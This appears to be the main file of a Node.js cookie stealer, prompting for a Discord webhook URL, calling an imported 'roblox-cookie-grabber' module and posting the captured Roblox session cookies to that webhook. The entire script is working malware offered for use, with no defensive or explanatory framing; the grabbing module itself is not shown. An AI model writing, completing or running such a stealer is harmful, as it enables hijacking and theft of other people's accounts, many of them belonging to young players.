const { grabRobloxCookies } = require('./roblox-cookie-grabber');
const { sendToDiscord } = require('./discord-webhook');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Enter the Discord webhook URL: ', async (webhookUrl) => {
    const cookies = await grabRobloxCookies();
    const data = {
        content: `Roblox Cookies: ${cookies.cookies}`
    };
    await sendToDiscord(webhookUrl, data);
    rl.close();
});
